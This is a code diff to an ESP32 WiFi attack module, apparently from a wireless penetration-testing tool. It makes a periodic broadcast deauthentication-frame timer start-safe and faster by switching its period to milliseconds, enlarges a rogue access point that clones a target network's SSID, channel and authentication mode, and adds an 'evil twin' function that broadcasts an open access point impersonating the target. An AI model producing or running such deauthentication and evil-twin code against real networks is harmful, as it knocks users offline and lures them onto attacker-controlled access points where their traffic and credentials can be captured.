@@ -21,6 +21,13 @@
 static const char *TAG = "main:attack_method";
 static esp_timer_handle_t deauth_timer_handle;
 
+static bool deauth_timer_running = false;
+
+// attack_method.c
+bool attack_method_broadcast_is_running(void) {
+    return deauth_timer_running;
+}
+
 /**
  * @brief Callback for periodic deauthentication frame timer
  * 
@@ -35,18 +42,22 @@ static void timer_send_deauth_frame(void *arg){
 /**
  * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
  */
-void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
+void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_ms){
+    if (deauth_timer_running) return;  // guard against double-start
     const esp_timer_create_args_t deauth_timer_args = {
         .callback = &timer_send_deauth_frame,
         .arg = (void *) ap_record
     };
     ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
-    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
+    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_ms * 1000));
+    deauth_timer_running = true;
 }
 
 void attack_method_broadcast_stop(){
+    if (!deauth_timer_running) return;  // guard against double-stop
     ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
     esp_timer_delete(deauth_timer_handle);
+    deauth_timer_running = false;
 }
 
 /**
@@ -63,9 +74,25 @@ void attack_method_rogueap(const wifi_ap_record_t *ap_record){
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
             .password = "dummypassword",
-            .max_connection = 1
+            .max_connection = 8,
+            .beacon_interval = 100
         },
     };
-    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
+    wifictl_ap_start(&ap_config);
+}
+
+void attack_method_evil_twin(const wifi_ap_record_t *ap_record){
+    ESP_LOGD(TAG, "Configuring Evil twin AP");
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid_len = strlen((char *)ap_record->ssid),
+            .channel = ap_record->primary,
+            .authmode = WIFI_AUTH_OPEN,
+            .max_connection = 8,
+            .beacon_interval = 100
+        },
+    };
+    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
     wifictl_ap_start(&ap_config);
 }
